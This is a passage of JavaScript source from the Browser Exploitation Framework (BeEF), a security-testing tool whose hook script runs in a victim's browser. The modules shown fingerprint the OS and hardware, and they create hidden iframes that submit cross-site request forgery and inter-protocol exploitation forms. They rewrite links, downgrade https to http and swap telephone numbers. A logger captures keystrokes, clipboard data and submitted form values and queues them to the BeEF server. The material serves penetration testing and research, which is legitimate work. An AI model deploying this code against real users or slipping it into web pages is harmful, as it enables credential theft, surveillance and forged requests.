		return (this.ua.match('(Windows NT 6.1)|(Windows NT 7.0)')) ? true : false;
	},

	isWin8: function() {
		return (this.ua.match('(Windows NT 6.2)')) ? true : false;
	},	
	
	isWin81: function() {
		return (this.ua.match('(Windows NT 6.3)')) ? true : false;
	},
	
	isOpenBSD: function() {
		return (this.ua.indexOf('OpenBSD') != -1) ? true : false;
	},
	
	isSunOS: function() {
		return (this.ua.indexOf('SunOS') != -1) ? true : false;
	},
	
	isLinux: function() {
		return (this.ua.match('(Linux)|(X11)')) ? true : false;
	},
	
	isMacintosh: function() {
		return (this.ua.match('(Mac_PowerPC)|(Macintosh)|(MacIntel)')) ? true : false;
	},

	isOsxYosemite: function(){ // TODO
		return (this.ua.match('(OS X 10_10)|(OS X 10.10)')) ? true : false;
	},
	isOsxMavericks: function(){ // TODO
		return (this.ua.match('(OS X 10_9)|(OS X 10.9)')) ? true : false;
	},
	isOsxSnowLeopard: function(){ // TODO
		return (this.ua.match('(OS X 10_8)|(OS X 10.8)')) ? true : false;
	},
	isOsxLeopard: function(){ // TODO
		return (this.ua.match('(OS X 10_7)|(OS X 10.7)')) ? true : false;
	},

	isWinPhone: function() {
		return (this.ua.match('(Windows Phone)')) ? true : false;
	},

	isIphone: function() {
		return (this.ua.indexOf('iPhone') != -1) ? true : false;
	},

	isIpad: function() {
		return (this.ua.indexOf('iPad') != -1) ? true : false;
	},

	isIpod: function() {
		return (this.ua.indexOf('iPod') != -1) ? true : false;
	},

	isNokia: function() {
		return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
	},

	isAndroid: function() {
		return (this.ua.match('Android')) ? true : false;
	},

	isBlackBerry: function() {
		return (this.ua.match('BlackBerry')) ? true : false;
	},

	isWebOS: function() {
		return (this.ua.match('webOS')) ? true : false;
	},

	isQNX: function() {
		return (this.ua.match('QNX')) ? true : false;
	},
	
	isBeOS: function() {
		return (this.ua.match('BeOS')) ? true : false;
	},

	isWindows: function() {
		return (this.ua.match('Windows')) ? true : false;
	},
	
	getName: function() {
		
		if(this.isWindows()){
			return 'Windows';
		}

		if(this.isMacintosh()) {
			return 'OSX';
		}

		//Nokia
		if(this.isNokia()) {
			if (this.ua.indexOf('Maemo Browser') != -1) return 'Maemo';
			if (this.ua.match('(SymbianOS)|(Symbian OS)')) return 'SymbianOS';
			if (this.ua.indexOf('Symbian') != -1) return 'Symbian';
		}

		// BlackBerry
		if(this.isBlackBerry()) return 'BlackBerry OS';

		// Android
		if(this.isAndroid()) return 'Android';

		// SunOS
		if(this.isSunOS()) return 'SunOS';

		//Linux
		if(this.isLinux()) return 'Linux';

		//iPhone
		if (this.isIphone()) return 'iOS';
		//iPad
		if (this.isIpad()) return 'iOS';
		//iPod
		if (this.isIpod()) return 'iOS';
		
		//others
		if(this.isQNX()) return 'QNX';
		if(this.isBeOS()) return 'BeOS';
		if(this.isWebOS()) return 'webOS';
		
		return 'unknown';
	},

	getVersion: function(){
		//Windows
		if(this.isWindows()) {
			if (this.isWin81())         return '8.1';
			if (this.isWin8())          return '8';
			if (this.isWin7())          return '7';
			if (this.isWinVista())      return 'Vista';
			if (this.isWinXP())         return 'XP';
			if (this.isWinServer2003()) return 'Server 2003';
			if (this.isWin2000SP1())    return '2000 SP1';
			if (this.isWin2000())       return '2000';
			if (this.isWinME())         return 'Millenium';

			if (this.isWinNT4())        return 'NT 4';
			if (this.isWinCE())         return 'CE';
			if (this.isWin95())         return '95';
			if (this.isWin98())         return '98';
		}

		// OS X
		if(this.isMacintosh()) {
			if (this.isOsxYosemite())        return '10.10';
			if (this.isOsxMavericks())       return '10.9';
			if (this.isOsxSnowLeopard())     return '10.8';
			if (this.isOsxLeopard())         return '10.7';
		}

		// TODO add Android/iOS version detection
	}
};

beef.regCmp('beef.net.os');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.hardware = {

  ua: navigator.userAgent,

  /*
   * @return: {String} CPU type
   **/
  cpuType: function() {
    var arch = 'UNKNOWN';
    // note that actually WOW64 means IE 32bit and Windows 64 bit. we are more interested
    // in detecting the OS arch rather than the browser build
    if (navigator.userAgent.match('(WOW64|x64|x86_64)') || navigator.platform.toLowerCase() == "win64"){
      arch = 'x86_64';
    }else if(typeof navigator.cpuClass != 'undefined'){
      switch (navigator.cpuClass) {
        case '68K':
          arch = 'Motorola 68K';
          break;
        case 'PPC':
          arch = 'Motorola PPC';
          break;
        case 'Digital':
          arch = 'Alpha';
          break;
        default:
          arch = 'x86';
      }
    }
    // TODO we can infer the OS is 64 bit, if we first detect the OS type (os.js).
    // For example, if OSX is at least 10.7, most certainly is 64 bit.
    return arch;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isTouchEnabled: function() {
    if ('ontouchstart' in document) return true;
    return false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isVirtualMachine: function() {
    if (screen.width % 2 || screen.height % 2) return true;
    return false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isLaptop: function() {
    // Most common laptop screen resolution
    if (screen.width == 1366 && screen.height == 768) return true;
    // Netbooks
    if (screen.width == 1024 && screen.height == 600) return true;
    return false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isNokia: function() {
    return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isZune: function() {
    return (this.ua.match('ZuneWP7')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isHtc: function() {
    return (this.ua.match('HTC')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isEricsson: function() {
    return (this.ua.match('Ericsson')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isMotorola: function() {
    return (this.ua.match('Motorola')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isGoogle: function() {
    return (this.ua.match('Nexus One')) ? true : false;
  },

  /**
   * Returns true if the browser is on a Mobile Phone
   * @return: {Boolean} true or false
   *
   * @example: if(beef.hardware.isMobilePhone()) { ... }
   **/
  isMobilePhone: function() {
    return DetectMobileQuick();
  },

  getName: function() {
    var ua = navigator.userAgent.toLowerCase();
    if(DetectIphone())              { return "iPhone"};
    if(DetectIpod())                { return "iPod Touch"};
    if(DetectIpad())                { return "iPad"};
    if (this.isHtc())               { return 'HTC'};
    if (this.isMotorola())          { return 'Motorola'};
    if (this.isZune())              { return 'Zune'};
    if (this.isGoogle())            { return 'Google Nexus One'};
    if (this.isEricsson())          { return 'Ericsson'};
    if(DetectAndroidPhone())        { return "Android Phone"};
    if(DetectAndroidTablet())       { return "Android Tablet"};
    if(DetectS60OssBrowser())       { return "Nokia S60 Open Source"};
    if(ua.search(deviceS60) > -1)   { return "Nokia S60"};
    if(ua.search(deviceS70) > -1)   { return "Nokia S70"};
    if(ua.search(deviceS80) > -1)   { return "Nokia S80"};
    if(ua.search(deviceS90) > -1)   { return "Nokia S90"};
    if(ua.search(deviceSymbian) > -1)   { return "Nokia Symbian"};
    if (this.isNokia())             { return 'Nokia'};
    if(DetectWindowsPhone7())       { return "Windows Phone 7"};
    if(DetectWindowsMobile())       { return "Windows Mobile"};
    if(DetectBlackBerryTablet())    { return "BlackBerry Tablet"};
    if(DetectBlackBerryWebKit())    { return "BlackBerry OS 6"};
    if(DetectBlackBerryTouch())     { return "BlackBerry Touch"};
    if(DetectBlackBerryHigh())      { return "BlackBerry OS 5"};
    if(DetectBlackBerry())          { return "BlackBerry"};
    if(DetectPalmOS())              { return "Palm OS"};
    if(DetectPalmWebOS())           { return "Palm Web OS"};
    if(DetectGarminNuvifone())      { return "Gamin Nuvifone"};
    if(DetectArchos())              { return "Archos"}
    if(DetectBrewDevice())          { return "Brew"};
    if(DetectDangerHiptop())        { return "Danger Hiptop"};
    if(DetectMaemoTablet())         { return "Maemo Tablet"};
    if(DetectSonyMylo())            { return "Sony Mylo"};
    if(DetectAmazonSilk())          { return "Kindle Fire"};
    if(DetectKindle())              { return "Kindle"};
    if(DetectSonyPlaystation())                 { return "Playstation"};
    if(ua.search(deviceNintendoDs) > -1)        { return "Nintendo DS"};
    if(ua.search(deviceWii) > -1)               { return "Nintendo Wii"};
    if(ua.search(deviceNintendo) > -1)          { return "Nintendo"};
    if(DetectXbox())                            { return "Xbox"};
    if(this.isLaptop())                         { return "Laptop"};
    if(this.isVirtualMachine())                 { return "Virtual Machine"};

    return 'Unknown';
  }
};

beef.regCmp('beef.hardware');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.dom
 *
 * Provides functionality to manipulate the DOM.
 */
beef.dom = {
	
	/**
	 * Generates a random ID for HTML elements
	 * @param: {String} prefix: a custom prefix before the random id. defaults to "beef-"
	 * @return: generated id
	 */
	generateID: function(prefix) {
		return ((prefix == null) ? 'beef-' : prefix)+Math.floor(Math.random()*99999);
	},	
		
	/**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		
		return el;
	},
	
	/**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
	removeElement: function(el) {
		if (!beef.dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	
	/**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	
	/**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		
		document.body.appendChild(iframe);
		
		return iframe;
	},

	/**
	 * Returns the highest current z-index
	 * @param: {Boolean} whether to return an associative array with the height AND the ID of the element
	 * @return: {Integer} Highest z-index in the DOM
	 * OR
	 * @return: {Hash} A hash with the height and the ID of the highest element in the DOM {'height': INT, 'elem': STRING}
	 */
	getHighestZindex: function(include_id) {
		var highest = {'height':0, 'elem':''};
		$j('*').each(function() {
			var current_high = parseInt($j(this).css("zIndex"),10);
			if (current_high > highest.height) {
				highest.height = current_high;
				highest.elem = $j(this).attr('id');
			}
		});

		if (include_id) {
			return highest;
		} else {
			return highest.height;
		}
	},
	
	/**
     * Create an iFrame element and prepend to document body. URI passed via 'src' property of function's 'params' parameter
     * is assigned to created iframe tag's src attribute resulting in GET request to that URI.
     * example usage in the code: beef.dom.createIframe('fullscreen', {'src':$j(this).attr('href')}, {}, null);
	 * @param: {String} type: can be 'hidden' or 'fullScreen'. defaults to normal
	 * @param: {Hash} params: list of params that will be sent in request.
	 * @param: {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
	 * @param: {Function} a callback function to fire once the iFrame has loaded
	 * @return: {Object} the inserted iFrame
     *
	 */
	createIframe: function(type, params, styles, onload) {
		var css = {};

		if (type == 'hidden') {
			css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles);
		} else if (type == 'fullscreen') {
			css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px', 'z-index':beef.dom.getHighestZindex()+1}, styles);
			$j('body').css({'padding':'0px', 'margin':'0px'});
		} else {
			css = styles;
			$j('body').css({'padding':'0px', 'margin':'0px'});
		}
		var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');
		
		return iframe;
	},

    /**
     * Load the link (href value) in an overlay foreground iFrame.
     * The BeEF hook continues to run in background.
     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
     * Framebusting techniques, this will not work.
     */
    persistentIframe: function(){
        $j('a').click(function(e) {
            if ($j(this).attr('href') != '')
            {
                e.preventDefault();
                beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
                $j(document).attr('title', $j(this).html());
                document.body.scroll = "no";
                document.documentElement.style.overflow = 'hidden';
            }
        });
    },

    /**
     * Load a full screen div that is black, or, transparent
     * @param: {Boolean} vis: whether or not you want the screen dimmer enabled or not
     * @param: {Hash} options: a collection of options to customise how the div is configured, as follows:
     *         opacity:0-100         // Lower number = less grayout higher = more of a blackout
     *           // By default this is 70 
     *         zindex: #             // HTML elements with a higher zindex appear on top of the gray out
     *           // By default this will use beef.dom.getHighestZindex to always go to the top
     *         bgcolor: (#xxxxxx)    // Standard RGB Hex color code
     *           // By default this is #000000
     */
	grayOut: function(vis, options) {
	  // in any order.  Pass only the properties you need to set.
	  var options = options || {};
	  var zindex = options.zindex || beef.dom.getHighestZindex()+1;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    // The dark layer doesn't exist, it's never been created.  So we'll
	    // create it here and apply some basic styles.
	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    // Calculate the page width and height 
	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	        var pageWidth = document.body.scrollWidth+'px';
	        var pageHeight = document.body.scrollHeight+'px';
	    } else if( document.body.offsetWidth ) {
	      var pageWidth = document.body.offsetWidth+'px';
	      var pageHeight = document.body.offsetHeight+'px';
	    } else {
	       var pageWidth='100%';
	       var pageHeight='100%';
	    }
	    //set the shader to cover the entire page and make it visible.
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	},

	/**
	 * Remove all external and internal stylesheets from the current page - sometimes prior to socially engineering,
	 *  or, re-writing a document this is useful.
	 */
	removeStylesheets: function() {
		$j('link[rel=stylesheet]').remove();
		$j('style').remove();
	},
	
	/**
     * Create a form element with the specified parameters, appending it to the DOM if append == true
	 * @param: {Hash} params: params to be applied to the form element
	 * @param: {Boolean} append: automatically append the form to the body
	 * @return: {Object} a form object
	 */
	createForm: function(params, append) {
		var form = $j('<form></form>').attr(params);
		if (append)
			$j('body').append(form);
		return form;
	},
	
	/**
	 * Get the location of the current page.
	 * @return: the location.
	 */
	getLocation: function() {
		return document.location.href;
	},
	
	/**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	},
	
	/**
	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinks: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $j(sel).each(function() {
			if ($j(this).attr('href') != null)
			{
				$j(this).attr('href', url).click(function() { return true; });
			}
		}).length;
	},

	/**
	 * Rewrites all links matched by selector to url, leveraging Bilawal Hameed's hidden click event overwriting.
	 * http://bilaw.al/2013/03/17/hacking-the-a-tag-in-100-characters.html
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksClickEvents: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $j(sel).each(function() {
			if ($j(this).attr('href') != null)
			{
				$j(this).click(function() {this.href=url});
			}
		}).length;
	},

	/**
     * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
	 * @param: {String} old_protocol: the old link protocol to be rewritten
	 * @param: {String} new_protocol: the new link protocol to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {

		var count = 0;
		var re = new RegExp(old_protocol+"://", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$j(sel).each(function() {
			if ($j(this).attr('href') != null) {
				var url = $j(this).attr('href');
				if (url.match(re)) {
					$j(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

	/**
	 * Parse all links in the page matched by the selector, replacing all telephone urls ('tel' protocol handler) with a new telephone number
	 * @param: {String} new_number: the new link telephone number to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteTelLinks: function(new_number, selector) {

		var count = 0;
		var re = new RegExp("tel:/?/?.*", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$j(sel).each(function() {
			if ($j(this).attr('href') != null) {
				var url = $j(this).attr('href');
				if (url.match(re)) {
					$j(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

    /**
     *  Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
     * @params: {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
     * @return: {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
     */
    parseAppletParams: function(params){
         var result = '';
         for (i in params){
           var param = params[i];
           for(key in param){
              result += "<param name='" + key + "' value='" + param[key] + "' />";
           }
         }
        return result;
    },

    /**
     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
     * example usage in the code, using a JAR archive (recommended and faster):
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
     * example usage in the code, using codebase:
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
     * @params: {String} id: reference identifier to the applet.
     * @params: {String} code: name of the class to be loaded. For example, beef.class.
     * @params: {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
     * @params: {String} archive: the jar that contains the code.
     * @params: {String} params: an array of additional params that the applet except.
     */
    attachApplet: function(id, name, code, codebase, archive, params) {
        var content = null;
        if (beef.browser.isIE()) {
            content = "" + // the classid means 'use the latest JRE available to launch the applet'
                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
                "height='0' width='0' name='" + name + "'> " +
                "<param name='code' value='" + code + "' />";

            if (codebase != null) {
                content += "<param name='codebase' value='" + codebase + "' />"
            }
            if (archive != null){
                content += "<param name='archive' value='" + archive + "' />";
            }
            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</object>";
        }
        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO() || beef.browser.isFF()) {

            if (codebase != null) {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</applet>";
        }
        // For some reasons JavaPaylod is not working if the applet is attached to the DOM with the embed tag rather than the applet tag.
//        if (beef.browser.isFF()) {
//            if (codebase != null) {
//                content = "" +
//                    "<embed id='" + id + "' code='" + code + "' " +
//                    "type='application/x-java-applet' codebase='" + codebase + "' " +
//                    "height='0' width='0' name='" + name + "'>";
//            } else {
//                content = "" +
//                    "<embed id='" + id + "' code='" + code + "' " +
//                    "type='application/x-java-applet' archive='" + archive + "' " +
//                    "height='0' width='0' name='" + name + "'>";
//            }
//
//            if (params != null) {
//                content += beef.dom.parseAppletParams(params);
//            }
//            content += "</embed>";
//        }
        $j('body').append(content);
    },

    /**
     * Given an id, remove the applet from the DOM.
     * @params: {String} id: reference identifier to the applet.
     */
    detachApplet: function(id) {
        $j('#' + id + '').detach();
    },

    /**
     * Create an invisible iFrame with a form inside, and submit it. Useful for XSRF attacks delivered via POST requests.
     * @params: {String} action: the form action attribute, where the request will be sent.
     * @params: {String} method: HTTP method, usually POST.
     * @params: {String} enctype: form encoding type
     * @params: {Array} inputs: an array of inputs to be added to the form (type, name, value).
     *         example: [{'type':'hidden', 'name':'1', 'value':''} , {'type':'hidden', 'name':'2', 'value':'3'}]
     */
    createIframeXsrfForm: function(action, method, enctype, inputs){
        var iframeXsrf = beef.dom.createInvisibleIframe();

        var formXsrf = document.createElement('form');
        formXsrf.setAttribute('action',  action);
        formXsrf.setAttribute('method',  method);
        formXsrf.setAttribute('enctype', enctype);

        var input = null;
        for (i in inputs){
            var attributes = inputs[i];
            input = document.createElement('input');
                for(key in attributes){
                    input.setAttribute(key, attributes[key]);
                }
            formXsrf.appendChild(input);
        }
        iframeXsrf.contentWindow.document.body.appendChild(formXsrf);
        formXsrf.submit();

        return iframeXsrf;
    },

    /**
     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
     * @params: {String} rhost: remote host ip/domain
     * @params: {String} rport: remote port
     * @params: {String} commands: protocol commands to be executed by the remote host:port service
     */
    createIframeIpecForm: function(rhost, rport, path, commands){
        var iframeIpec = beef.dom.createInvisibleIframe();

        var formIpec = document.createElement('form');
        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
        formIpec.setAttribute('method',  'POST');
        formIpec.setAttribute('enctype', 'multipart/form-data');

        input = document.createElement('textarea');
        input.setAttribute('name', Math.random().toString(36).substring(5));
        input.value = commands;
        formIpec.appendChild(input);
        iframeIpec.contentWindow.document.body.appendChild(formIpec);
        formIpec.submit();

        return iframeIpec;
    }

};

beef.regCmp('beef.dom');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.logger
 *
 * Provides logging capabilities.
 */
beef.logger = {
	
	running: false,
    /**
    * Internal logger id
    */
    id: 0,
	/**
	 * Holds events created by user, to be sent back to BeEF
	 */
	events: [],
	/**
	 * Holds current stream of key presses
	 */
	stream: [],
	/**
	 * Contains current target of key presses
	 */
	target: null,
	/**
	 * Holds the time the logger was started
	 */
	time: null,
    /**
    * Holds the event details to be sent to BeEF
    */
    e: function() {
        this.id = beef.logger.get_id();
        this.time = beef.logger.get_timestamp();
        this.type = null;
        this.x = 0;
        this.y = 0;
        this.target = null;
        this.data = null;
        this.mods = null;
    },
	
	/**
	 * Starts the logger
	 */
	start: function() {

		beef.browser.hookChildFrames();
		this.running = true;
		var d = new Date();
		this.time = d.getTime();

		$j(document).keypress(
			function(e) { beef.logger.keypress(e); }
		).click(
			function(e) { beef.logger.click(e); }
		);
		$j(window).focus(
			function(e) { beef.logger.win_focus(e); }
		).blur(
			function(e) { beef.logger.win_blur(e); }
		);
		$j('form').submit(
			function(e) { beef.logger.submit(e); }
		);
		document.body.oncopy = function() {
			setTimeout("beef.logger.copy();", 10);
		};
		document.body.oncut = function() {
			setTimeout("beef.logger.cut();", 10);
		};
		document.body.onpaste = function() {
			beef.logger.paste();
		}
	},
	
	/**
	 * Stops the logger
	 */
	stop: function() {
		this.running = false;
		clearInterval(this.timer);
		$j(document).keypress(null);
	},

    /**
    * Get id
    */
    get_id: function() {
        this.id++;
        return this.id;
    },

	/**
	 * Click function fires when the user clicks the mouse.
	 */
	click: function(e) {
        var c = new beef.logger.e();
        c.type = 'click';
        c.x = e.pageX;
        c.y = e.pageY;
        c.target = beef.logger.get_dom_identifier(e.target);
        this.events.push(c);
	},
	
	/**
	 * Fires when the window element has regained focus
	 */
	win_focus: function(e) {
        var f = new beef.logger.e();
        f.type = 'focus';
        this.events.push(f);
	},
	
	/**
	 * Fires when the window element has lost focus
	 */
	win_blur: function(e) {
        var b = new beef.logger.e();
        b.type = 'blur';
		this.events.push(b);
	},
	
	/**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
	keypress: function(e) {
		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
		{
			beef.logger.push_stream();
			this.target = e.target;
		}
		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
	},
	
	/**
	 * Copy function fires when the user copies data to the clipboard.
	 */
	copy: function(x) {
		try {
			var c = new beef.logger.e();
			c.type = 'copy';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Cut function fires when the user cuts data to the clipboard.
	 */
	cut: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'cut';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Paste function fires when the user pastes data from the clipboard.
	 */
	paste: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'paste';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Submit function fires whenever a form is submitted
     * TODO: Cleanup this function
	 */
	submit: function(e) {
		try {
			var f = new beef.logger.e();
			var values = "";
			f.type = 'submit';
			f.target = beef.logger.get_dom_identifier(e.target);
			for (var i = 0; i < e.target.elements.length; i++) {
	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
	        }
			f.data = 'Action: '+$j(e.target).attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
			this.events.push(f);
		} catch(e) {}
	},
	
	/**
	 * Pushes the current stream to the events queue
	 */
	push_stream: function() {
		if (this.stream.length > 0)
		{
			this.events.push(beef.logger.parse_stream());
			this.stream = [];
		}
	},
	
	/**
	 * Translate DOM Object to a readable string
	 */
	get_dom_identifier: function(target) {
		target = (target == null) ? this.target : target;
		var id = '';
		if (target)
		{
			id = target.tagName.toLowerCase();
			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
		}
		return id;
	},
	
	/**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
	get_timestamp: function() {
		var d = new Date();
		return ((d.getTime() - this.time) / 1000).toFixed(3);
	},
	
	/**
	 * Parses stream array and creates history string
	 */
	parse_stream: function() {
		var s = '';
        var mods = '';
		for (var i in this.stream){
         try{
            var mod = this.stream[i]['modifiers'];
            s += String.fromCharCode(this.stream[i]['char']);
            if(typeof mod != 'undefined' &&
                      (mod['alt'] == true ||
                      mod['ctrl'] == true ||
                      mod['shift'] == true)){
                mods += (mod['alt']) ? ' [Alt] ' : '';
                mods += (mod['ctrl']) ? ' [Ctrl] ' : '';
                mods += (mod['shift']) ? ' [Shift] ' : '';
                mods += String.fromCharCode(this.stream[i]['char']);
            }

         }catch(e){}
		}
        var k = new beef.logger.e();
        k.type = 'keys';
        k.target = beef.logger.get_dom_identifier();
        k.data = s;
        k.mods = mods;
        return k;
	},
	
	/**
	 * Queue results to be sent back to framework
	 */
	queue: function() {
		beef.logger.push_stream();
		if (this.events.length > 0)
		{
			beef.net.queue('/event', 0, this.events);
			this.events = [];
		}
	}
		
};

beef.regCmp('beef.logger');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net
 *
 * Provides basic networking functions,
 * like beef.net.request and beef.net.forgeRequest,
 * used by BeEF command modules and the Requester extension,
 * as well as beef.net.send which is used to return commands
 * to BeEF server-side components.
 *
 * Also, it contains the core methods used by the XHR-polling
 * mechanism (flush, queue)
 */
beef.net = {

    host: "google.com",
    port: "80",
    hook: "/hook.js",
    httpproto: "http",
    handler: '/dh',
    chop: 500,
    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
    sid_count: 0,
    cmd_queue: [],

    /**
     * Command object. This represents the data to be sent back to BeEF,
     * using the beef.net.send() method.
     */
    command: function () {
        this.cid = null;
        this.results = null;
        this.status = null;
        this.handler = null;
        this.callback = null;
    },

    /**
     * Packet object. A single chunk of data. X packets -> 1 stream
     */
    packet: function () {
        this.id = null;
        this.data = null;
    },

    /**
     * Stream object. Contains X packets, which are command result chunks.
     */
    stream: function () {
        this.id = null;
        this.packets = [];
        this.pc = 0;
        this.get_base_url_length = function () {
            return (this.url + this.handler + '?' + 'bh=' + beef.session.get_hook_session_id()).length;
        };
        this.get_packet_data = function () {
            var p = this.packets.shift();
            return {'bh': beef.session.get_hook_session_id(), 'sid': this.id, 'pid': p.id, 'pc': this.pc, 'd': p.data }
        };
    },

    /**
     * Response Object - used in the beef.net.request callback
     * NOTE: as we are using async mode, the response object will be empty if returned.
